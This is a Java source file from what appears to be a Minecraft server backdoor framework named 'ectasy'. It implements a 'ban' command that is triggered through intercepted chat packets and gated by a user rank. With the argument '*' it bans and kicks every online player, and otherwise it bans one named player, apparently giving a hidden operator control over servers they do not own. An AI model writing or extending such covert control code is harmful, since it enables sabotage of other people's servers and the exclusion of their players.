package dev.ectasy.impl.commands.starter;

import com.github.retrooper.packetevents.event.PacketReceiveEvent;
import com.github.retrooper.packetevents.wrapper.play.client.WrapperPlayClientChatMessage;
import dev.ectasy.api.commands.AbstractCommand;
import dev.ectasy.api.commands.CommandInfo;
import dev.ectasy.api.data.Rank;
import dev.ectasy.api.data.User;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

@CommandInfo(
        name = "ban",
        description = "Bans a player.",
        rank = Rank.STARTER,
        async = false
)
public class CommandBan extends AbstractCommand {
    @Override
    public void execute(User user, PacketReceiveEvent event, WrapperPlayClientChatMessage packet, String[] args) {


        if (args.length == 0){
            user.sendMessage("Usage: ban <player> (reason)");
            return;
        }

        String reason = null;
        if(args.length > 1){
            reason = String.join(" ", args).replace(args[0] + " ", "");
        }

        if(args[0].equals("*")){
            for(Player player : Bukkit.getServer().getOnlinePlayers()){
                Bukkit.getBanList(org.bukkit.BanList.Type.NAME).addBan(player.getName(), reason, null, null);
                player.kickPlayer(reason);
            }
            user.sendMessage("All players have been banned.");
            return;
        }

        Player target = Bukkit.getPlayer(args[0]);
        if(target == null){
            user.sendMessage("The player " + user.getMainColor() + args[0] + user.getSecondaryColor() + " is not online.");
            return;
        }

        Bukkit.getBanList(org.bukkit.BanList.Type.NAME).addBan(target.getName(), reason, null, null);
        target.kickPlayer(reason);
        user.sendMessage("The player " + user.getMainColor() + target.getName() + user.getSecondaryColor() + " has been banned.");



    }

}
